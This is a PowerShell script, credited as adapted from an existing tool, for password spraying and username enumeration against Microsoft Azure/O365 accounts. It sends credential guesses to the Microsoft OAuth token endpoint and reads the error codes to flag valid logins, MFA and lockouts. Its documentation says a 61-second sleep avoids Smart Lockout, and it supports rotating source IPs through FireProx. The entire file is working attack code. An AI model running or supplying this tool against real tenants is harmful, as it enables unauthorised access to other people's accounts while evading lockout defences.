function Invoke-MSOLEnum{

    <#
        .CREDIT
            This primary work on this module is the creating from Beau Bullock (@dafthack).  I have simply updated it to be used for UserID enumeration against a large username list where the userlist does not contain the @domain.com.  The script will request the user to input the @domain.com when executing.
        .SYNOPSIS
            This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.       
            MSOLSpray Function: Invoke-MSOLSpray
            Author: Beau Bullock (@dafthack)
            License: BSD 3-Clause
            Required Dependencies: None
            Optional Dependencies: None
    
        .DESCRIPTION
            
            This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
            The module has also been modified from the orignal script by Beau Bullock to include the ability to provide a DOMAIN name to be appended to the user list, options for both a single PASSWORD or a FILE with a list of passwords, as well as providing a varible of the amount of seconds to SLEEP between each individual authentication attempt.      
        
        .PARAMETER UserList
            
            UserList file filled with usernames one-per-line in the format "user@domain.com"
        
        .PARAMETER Password
            
            A single password that will be used to perform the password spray.
    
        .PARAMETER PWList
            
            A file with a list of passwords that will be used to perform the password spray.
    
        .PARAMETER Domain
            
            Domain to be appended to the end each username to allow for the userlist to be a generic list without domain name included.
            
        .PARAMETER Sleep
            
            The number of SECONDS to sleep between each individual authenticaiton attempt. This was added in an attempt to overcome SmartLockOut features of MSOL. Testing indicates that by setting this value to 61 the Lockout trigger can be avoided.
    
        .PARAMETER OutFile
            
            A file to output valid results to.
        
        .PARAMETER Force
            
            Forces the spray to continue and not stop when multiple account lockouts are detected.
        
        .PARAMETER URL
            
            The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
        
        .EXAMPLE
            
            With single password
            C:\PS> Invoke-MSOLEnum -UserList .\userlist.txt -Password TESTPASS -OutFile validusers.txt -Domain company.com -Sleep 61
            Description
            -----------
            This command will use the provided userlist and attempt to authenticate to each account with a password of TESTPASS.
        
            With a File containinig multiple passwords
            C:\PS> Invoke-MSOLEnum -UserList .\userlist.txt -PWList ./pwlist.txt -OutFile validusers.txt -Domain company.com -Sleep 61
            Description
            -----------
            This command will use the provided userlist and to attempt to authenticate to each account with a passwords of in the ./pwlist.txt file.
    
        .EXAMPLE
            
            C:\PS> Invoke-MSOLEnum -UserList .\userlist.txt -Password TESTPASS -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox -Domain company.com -OutFile valid-users.txt -Sleep 61
            Description
            -----------
            This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
    #>
      Param(
    
    
        [Parameter(Position = 0, Mandatory = $False)]
        [string]
        $OutFile = "",
    
        [Parameter(Position = 1, Mandatory = $False)]
        [string]
        $UserList = "",
    
        [Parameter(Position = 2, Mandatory = $False)]
        [string]
        $Password = "",
    
        # Change the URL if you are using something like FireProx
        [Parameter(Position = 3, Mandatory = $False)]
        [string]
        $URL = "https://login.microsoft.com",
    
        [Parameter(Position = 4, Mandatory = $False)]
        [switch]
        $Force,
        
        # DOMAIN name
        [Parameter(Position = 4, Mandatory = $False)]
        [string]
        $Domain = "",
    
            # Pssword List
        [Parameter(Position = 4, Mandatory = $False)]
        [string]
        $PWList = "",
    
            # Sleep timer
        [Parameter(Position = 4, Mandatory = $False)]
        [string]
        $Sleep = "",
    
                # Password Temp File
        [Parameter(Position = 4, Mandatory = $False)]
        [string]
        $PWFile = ""
      )
        
        $ErrorActionPreference= 'silentlycontinue'
        $Usernames = Get-Content $UserList
    
        $count = $Usernames.count
        $curr_user = 0
        $lockout_count = 0
        $lockoutquestion = 0
        $fullresults = @()
    
        Write-Host -ForegroundColor "yellow" ("[*] There are " + $count + " total users to spray.")
    
    
                # Allow user to verify expected password spray interval based on sleep time and number of user accounts, before proceeding
                if ($PWList)
                {
                    If (!$Sleep -or $Sleep -eq 0)
                    {
                        Write-Host -ForegroundColor "red" ("[*] WARNING - With no Sleep value or Sleep = 0, cannot calculate expected per password time interval.")
                    }
                    $title = "[*] With a Sleep value of " + $Sleep + " seconds, it will take aprox "+ [math]::Truncate($count*$sleep/60) + " minutes per password."
                    $message = "Do you want to continue this spray?"
    
                    $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                        "Continues the password spray."
    
                    $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
                        "Cancels the password spray."
    
                    $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
    
                    $result = $host.ui.PromptForChoice($title, $message, $options, 0)
                    $continuequestion++
                    if ($result -ne 0)
                    {
                        Write-Host "[*] Cancelling the password spray."
                        break
                    }
                }
            Write-Host -ForegroundColor "yellow" "[*] Now spraying Microsoft Online."
            $currenttime = Get-Date
            Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"                
    
    
        # When a single password is supplied in the command line and NOT a file with list of passwords
        If ($Password)
        {
            $Password | Out-File -Encoding ascii ./pwfile-temp.txt
        }
    
        # When a file with a list of passwords to spray is provided in the command line
        If ($PWList)
        {
        #    $PWFile = Get-Content $PWList
        #    $PWFile | Out-File -Encoding ascii ./pwfile-temp.txt
        Copy-Item $PWList -Destination ./pwfile-temp.txt
        }
    
        $Passwords = Get-Content ./pwfile-temp.txt
        
        ForEach ($Password in $Passwords){
            Write-Host -ForegroundColor "yellow" "[*] Current Password to Spray: $Password"
            ForEach ($username in $usernames){
                
                # User counter
                $curr_user += 1
                Write-Host -nonewline "$curr_user of $count users tested`r"
    
                # Setting up the web request
                $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username+'@'+$domain ; 'password' = $password ; 'scope' = 'openid'}
                $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
                $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
    
                # If we get a 200 response code it's a valid cred
                If ($webrequest.StatusCode -eq "200"){
                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password"
                    $webrequest = ""
                    $fullresults += "$username : $password"
                    Start-Sleep -s $Sleep
                }
                else{
                        # Check the response for indication of MFA, tenant, valid user, etc...
                        # Here is a referense list of all the Azure AD Authentication an Authorization Error Codes:
                        # https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
    
                        # Standard invalid password
                    If($RespErr -match "AADSTS50126")
                        {
                        Write-Host -ForegroundColor "white" "[*] ENUMERATED! $username@$domain"
                        $fullresults += "$username@$domain"
                        Start-Sleep -s $Sleep
                        }
    
                        # Invalid Tenant Response
                    ElseIf (($RespErr -match "AADSTS50128") -or ($RespErr -match "AADSTS50059"))
                        {
                        Write-Output "[*] WARNING! Tenant for account $username doesn't exist. Check the domain to make sure they are using Azure/O365 services."
                        Start-Sleep -s $Sleep
                        }
                        
                        # Invalid Username
                    ElseIf($RespErr -match "AADSTS50034")
                        {
                        Write-Output "[*] Invalid UserID: $username@$domain"
                        Start-Sleep -s $Sleep
                        }
    
                        # Microsoft MFA response
                    ElseIf(($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076"))
                        {
                        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates MFA (Microsoft) is in use."
                        $fullresults += "$username : $password"
                        Start-Sleep -s $Sleep
                        }
            
                        # Conditional Access response (Based off of limited testing this seems to be the repsonse to DUO MFA)
                    ElseIf($RespErr -match "AADSTS50158")
                        {
                        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
                        $fullresults += "$username : $password"
                        Start-Sleep -s $Sleep
                        }
    
                        # Locked out account or Smart Lockout in place
                    ElseIf($RespErr -match "AADSTS50053")
                        {
                        Write-Output "[*] WARNING! The account $username appears to be locked."
                        $lockout_count++
                        Start-Sleep -s $Sleep
                        }
    
                        # Disabled account
                    ElseIf($RespErr -match "AADSTS50057")
                        {
                        Write-Output "[*] WARNING! The account $username appears to be disabled."
                        Start-Sleep -s $Sleep
                        }
                    
                        # User password is expired
                    ElseIf($RespErr -match "AADSTS50055")
                        {
                        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The user's password is expired."
                        $fullresults += "$username : $password"
                        Start-Sleep -s $Sleep
                        }
    
                        # Unknown errors
                    Else
                        {
                        Write-Output "[*] Invalid UserID: $username@$domain"
                        #$RespErr
                        Start-Sleep -s $Sleep
                        }
                }
            
                # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
                if (!$Force -and $lockout_count -eq 10 -and $lockoutquestion -eq 0)
                {
                    $title = "WARNING! Multiple Account Lockouts Detected!"
                    $message = "10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"
    
                    $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                        "Continues the password spray."
    
                    $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
                        "Cancels the password spray."
    
                    $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
    
                    $result = $host.ui.PromptForChoice($title, $message, $options, 0)
                    $lockoutquestion++
                    if ($result -ne 0)
                    {
                        Write-Host "[*] Cancelling the password spray."
                        Write-Host "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
                        break
                    }
                }
                
            }
        }
    
        # Output to file
        if ($OutFile -ne "")
        {
            If ($fullresults)
            {
            $fullresults | Out-File -Encoding ascii $OutFile
            Write-Output "Results have been written to $OutFile."
            }
        Remove-Item ./pwfile-temp.txt
        }
    }